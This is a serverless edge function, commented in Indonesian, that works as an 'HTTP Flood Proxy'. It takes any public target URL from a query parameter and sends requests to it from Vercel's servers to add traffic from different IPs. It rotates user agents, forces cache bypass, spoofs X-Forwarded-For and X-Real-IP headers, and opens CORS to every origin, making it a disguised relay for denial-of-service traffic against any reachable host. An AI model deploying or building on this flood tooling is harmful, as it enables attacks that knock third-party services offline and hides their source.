/**
 * Vercel Serverless Function — HTTP Flood Proxy
 * 
 * Endpoint: GET /api/flood?target=<url>
 * 
 * Ini membuat HTTP request NYATA dari server Vercel ke target.
 * Digunakan saat browser diblok Private Network Access (PNA) atau
 * untuk menambah trafik dari IP yang berbeda.
 * 
 * PENTING: Server Vercel TIDAK BISA menjangkau IP privat (192.168.x.x).
 * Target harus PUBLIC/reachable dari internet (misal: modul WiFi Anda
 * yang sudah di-port-forward, atau pakai Cloudflare Tunnel / ngrok).
 */

export const config = {
  runtime: 'edge'
};

const ALLOWED_PROTOCOLS = ['http:', 'https:'];

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
];

function jsonResponse(data, status) {
  return new Response(JSON.stringify(data), {
    status: status || 200,
    headers: {
      'content-type': 'application/json; charset=utf-8',
      'access-control-allow-origin': '*',
      'access-control-allow-methods': 'GET, POST, OPTIONS',
      'access-control-allow-headers': 'content-type',
      'cache-control': 'no-store'
    }
  });
}

function pickUA() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

export default async function handler(request) {
  const url = new URL(request.url);
  const target = url.searchParams.get('target');
  const method = (url.searchParams.get('method') || 'GET').toUpperCase();

  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 204,
      headers: {
        'access-control-allow-origin': '*',
        'access-control-allow-methods': 'GET, POST, OPTIONS',
        'access-control-allow-headers': 'content-type'
      }
    });
  }

  if (!target) {
    return jsonResponse({ success: false, error: 'missing target parameter' }, 400);
  }

  let targetUrl;
  try {
    const normalized = target.startsWith('http') ? target : 'http://' + target;
    targetUrl = new URL(normalized);
  } catch (e) {
    return jsonResponse({ success: false, error: 'invalid target url' }, 400);
  }

  if (ALLOWED_PROTOCOLS.indexOf(targetUrl.protocol) === -1) {
    return jsonResponse({ success: false, error: 'protocol not allowed' }, 400);
  }

  const start = Date.now();

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(function () { controller.abort(); }, 5000);

    const response = await fetch(targetUrl.href, {
      method: method,
      signal: controller.signal,
      redirect: 'follow',
      headers: {
        'User-Agent': pickUA(),
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1'
      }
    });

    clearTimeout(timeoutId);

    const elapsed = Date.now() - start;

    return jsonResponse({
      success: true,
      status: response.status,
      statusText: response.statusText,
      elapsed: elapsed,
      target: targetUrl.href
    }, 200);

  } catch (err) {
    const elapsed = Date.now() - start;
    return jsonResponse({
      success: false,
      error: err && err.message ? err.message : 'unknown error',
      elapsed: elapsed,
      target: targetUrl.href
    }, 200);
  }
}
